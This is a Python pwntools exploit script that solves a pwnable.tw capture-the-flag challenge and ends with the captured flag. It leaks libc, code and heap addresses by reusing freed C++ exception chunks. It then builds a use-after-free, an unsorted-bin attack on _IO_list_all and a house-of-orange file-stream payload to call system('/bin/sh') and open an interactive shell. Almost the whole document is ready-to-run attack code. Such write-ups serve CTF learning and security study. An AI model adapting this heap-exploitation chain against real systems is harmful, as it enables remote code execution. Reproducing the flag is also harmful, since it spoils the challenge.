from pwn import *
'''
struct prison
{
  _QWORD *Risk;
  _QWORD *name;
  _QWORD *nickname;
  _DWORD age;
  _DWORD cell;
  _QWORD *sentence;
  _QWORD Note_size;
  _QWORD *Note;
  _QWORD *next_prison;
};

'''
def note(no, size, text):
  r.sendafter(b'> ',b'note')
  r.sendafter(b'Cell: ',str(no))
  r.sendafter(b'Size: ',str(size))
  r.sendafter(b'Note: ',text)

#r = process('./B',env={"LD_PRELOAD" : "./libc-2.23.so"})
r = remote('chall.pwnable.tw',10400)

### white_list addr - libc_addr = 0x108e000
'''
if we send a wrong command, it will cause exception and do exception handling  
During exception handling, __cxa_allocate_exception functon will allocate one chunk to store exception information(exception object and exception header)
Then do stack_unwind(_Unwind_RaiseException) to return to main functoin's catch block
After excpetion handling, the chunk store exception information will be free, so next malloc will get this chunk
And we can leak info through it 
ref : https://zhuanlan.zhihu.com/p/336567862
'''

note(5,0x120,b'\x00')  ### prepare for  unsorted bin 
note(6,0x200,b'\x00')  ### prepare for house of orange

### leak libc base using smallbin and  exception information
r.send(b'123')
note(0,0x18,b'\x00')
r.send(b'list')

leak = r.recvuntil(b'\x7f')
libc_base = u64(leak[-6:-1] + b'\x7f' + b'\x00' * 2) - 0x3c3b00
print(f'libc : {hex(libc_base)}')

note(9,0x88,b'\x00')
r.sendafter(b'> ',b'list')
r.recvuntil(b'Note: ')
r.recv(0x8*10)

code_base = u64(r.recv(8)) - 0xf77
heap_base = u64(r.recv(8)) - 0x12800
print(f'code_base : {hex(code_base)}')
print(f'heap_base : {hex(heap_base)}')


while_list_addr = libc_base + 0x108e000 
while_list_addr = libc_base + 0x5eb000
unsorted_bin_addr = heap_base + 0x12510
IO_list_all_addr = libc_base + 0x3c4520
system = libc_base + 0x45390
vtable_addr = heap_base + 0x125e0

# get unsorted bin by realloc cell 5's note to larger size, and realloc will free origin note and malloc new larger size chunks
# then we can get one unsorted bin 

note(5,0x130,b'\x00')  # heap_base + 0x12440
note(7,(0x130-0x60-0x10), b'\x00') ## create 0x60 size unsorted bin fot house of orange

### due to readonly at white_list section, we can only write at heap section
### so I decode to do house of orange
### use unsorted bin attack to overwrite IO_list_all and fsop to get shell  

### use punish function and malloc same size chunk to get UAF of prison structure
note(7,0xc8,b'\x00' * 0xc0 + b'/bin/sh\x00')
r.sendafter(b'> ',b'punish')
r.sendafter(b'Cell: ',b'1')
payload = p64(0)*3 + p32(0) + p32(1) + p64(0) + p64(0x99) + p64(unsorted_bin_addr)  ## fake prison struct
note(2,0x39,payload)   ### get cell 1 chunk to do UAF

### house of orange payload 
payload = p64(0) + p64(IO_list_all_addr - 0x10)
payload += p64(0) + p64(1) ### io_write_ptr > io_write_base
note(1,0x49,payload)

payload = p64(0) * 13 + p64 (vtable_addr) + p64(0) * 3 + p64(system)
note(6,0x201,payload)

r.sendafter(b'> ',b'note')
r.sendafter(b'Cell: ',b'9')
r.wait(0.5)
r.sendafter(b'Size: ',b'500')

r.interactive()


### FLAG{Br3ak_0ut_7He_Pr1s0N}